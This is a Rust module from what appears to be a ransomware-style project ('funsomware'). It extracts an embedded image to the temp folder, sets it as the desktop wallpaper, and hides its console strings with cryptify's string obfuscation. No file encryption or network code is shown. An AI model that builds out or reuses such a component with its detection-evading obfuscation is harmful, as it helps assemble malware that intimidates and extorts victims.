use cryptify::encrypt_string;
use std::fs;
use std::io::Write;
use std::path::PathBuf;

/// Embedded wallpaper image
const WALLPAPER_IMAGE: &[u8] = include_bytes!("../rsrc/wallpaper.png");

/// Set the wallpaper by extracting the embedded image and setting it
pub fn set_wallpaper() -> Result<(), Box<dyn std::error::Error>> {
    // Get temp directory for wallpaper
    let wallpaper_path = get_wallpaper_path()?;
    
    if crate::config::SHOW_CLI {
        println!("{} {:?}", encrypt_string!("Extracting wallpaper to"), wallpaper_path);
    }
    
    // Write embedded image to disk
    let mut file = fs::File::create(&wallpaper_path)?;
    file.write_all(WALLPAPER_IMAGE)?;
    
    if crate::config::SHOW_CLI {
        println!("{}", encrypt_string!("Setting wallpaper..."));
    }
    
    // Set the wallpaper
    wallpaper::set_from_path(wallpaper_path.to_str().unwrap())?;
    
    if crate::config::SHOW_CLI {
        println!("{}", encrypt_string!("Wallpaper set successfully!"));
    }
    
    Ok(())
}

/// Get the path where we'll save the wallpaper
fn get_wallpaper_path() -> Result<PathBuf, Box<dyn std::error::Error>> {
    #[cfg(target_os = "windows")]
    {
        // Windows: Use AppData\Local\Temp
        let temp_dir = std::env::temp_dir();
        Ok(temp_dir.join("funsomware_wallpaper.png"))
    }
    
    #[cfg(not(target_os = "windows"))]
    {
        // Linux: Use /tmp
        Ok(PathBuf::from("/tmp/funsomware_wallpaper.png"))
    }
}

/// Check if wallpaper setting is supported on this platform
#[allow(dead_code)]
pub fn is_supported() -> bool {
    // The wallpaper crate supports Windows, macOS, and most Linux DEs
    // It will return an error if not supported, so we'll just try it
    true
}
